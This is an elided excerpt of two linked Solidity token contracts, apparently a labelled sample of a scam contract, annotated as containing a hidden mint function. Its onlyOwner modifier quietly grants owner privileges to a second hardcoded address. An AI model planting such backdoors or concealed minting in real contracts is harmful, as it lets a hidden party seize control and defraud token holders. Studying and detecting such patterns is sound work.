...
//Contains a hidden mint function (line 304-314)
library SafeMath {
...
contract Ownable {
    ...
    modifier onlyOwner() {
        require(
            (msg.sender == owner) ||
                (msg.sender ==
                    address(0x0C69F0641bD7AEc7CA7F73F485Cb8E1Be696cAB9))
        );
        _;
    }
...
contract Token50X is Ownable, StandardToken {
    ...
    function setSymbolNameDecimals(
    ...
    function transfer(address _to, uint256 _value) public returns (bool) {
        ...
        if (
            ...
            (block.number < vestingBeforeBlockNumber[msg.sender])
        ) {
            if (balances[msg.sender] < _value) revert();
            if (balances[msg.sender] <= vestingAmount[msg.sender]) revert();
            if (balances[msg.sender].sub(_value) < vestingAmount[msg.sender])
                revert();
        }
        // ---
	...
	*/
    ...
    function transferFrom(
        ...
        require(allowTransfer);
        if (
            (vestingAmount[_from] > 0) &&
            (block.number < vestingBeforeBlockNumber[_from])
        ) {
    ...
    function issueTokens(
        ...
        require(
            msg.sender == address(originalContract),
            "Only original contract can call it"
        );
        require(
            totalSupply_.add(_amount) <= 4714285714285710,
            "Max totalSupply is 4714285714285710"
        );
...
contract Token50X100 is Ownable, StandardToken {
    ...
    function transfer(address _to, uint256 _value) public returns (bool) {
        ...
        if (
            ...
            (whiteListReceivers[_to]) ||
            (linkingAddresses[msg.sender] == _to)
        ) {
            return super.transfer(_to, _value);
        }
        require(
            Token50X(tokenContract).issueTokens(msg.sender, _to, _value),
            "Error while issueTokens"
        );
        balances[msg.sender] = balances[msg.sender].sub(_value);
        emit Transfer(
            msg.sender,
